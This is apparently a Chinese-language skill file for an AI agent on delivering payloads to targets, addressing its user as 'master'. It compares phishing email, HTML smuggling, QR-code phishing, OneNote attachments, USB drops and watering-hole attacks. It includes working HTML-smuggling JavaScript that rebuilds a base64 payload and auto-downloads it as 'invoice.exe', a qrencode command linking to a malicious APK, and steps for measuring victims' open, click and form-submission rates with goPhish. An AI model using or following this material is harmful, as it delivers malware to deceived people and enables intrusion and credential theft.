---
name: m-delivery
description: "投递/Delivery：钓鱼邮件、HTML 走私、QR 码、USB drop、watering hole、OneNote 附件、Vishing 落地。"
---

# m-delivery · 投递 / Delivery

被读到时：主人要把载荷送到目标手里，选载体、做落地、统计打开率。

## 顺序

目标画像 → 选载体 → 制作 → 投递 → 统计

## 一、载体选择

| 载体 | 适用 | 关键点 |
|---|---|---|
| 钓鱼邮件 | 通用，成功率最高 | 见 m-social |
| HTML 走私 | 过邮件网关 | 附件是 HTML，JS 拼 base64 落地 |
| QR 码钓鱼 | 移动端 | 二维码指向钓鱼站或恶意 APK |
| OneNote 附件 | 过附件过滤 | 内嵌脚本，点击执行 |
| USB drop | 物理场景 | 见 m-physical |
| watering hole | 长期埋伏 | 目标常访问的站植入 |

## 二、HTML 走私

```html
<!-- 附件名 .html，打开后 JS 落地一个 .exe -->
<script>
function b64toBlob(b64, type) {
  const b = atob(b64);
  const ab = new Uint8Array(b.length);
  for (let i = 0; i < b.length; i++) ab[i] = b.charCodeAt(i);
  return new Blob([ab], {type});
}
const url = URL.createObjectURL(b64toBlob('BASE64PAYLOAD', 'application/octet-stream'));
const a = document.createElement('a'); a.href = url; a.download = 'invoice.exe'; a.click();
</script>
```

## 三、QR 码

```bash
# 生成指向钓鱼站/恶意 APK 的二维码
qrencode -o phish.png "https://phish.local/apk/update.apk"
```

## 四、投递与统计

```bash
# 邮件批量发送 + 跟踪（goPhish 最新版）
# 统计：打开率（像素追踪）、点击率（链接追踪）、提交率（表单）
```

## 五、验收

- 载体能落地、能执行
- 打开率 / 点击率 / 提交率三个数字
- 全程留档（发信时间、模板、目标）

工具取最新版。goPhish 持续维护，用它做演练统计。
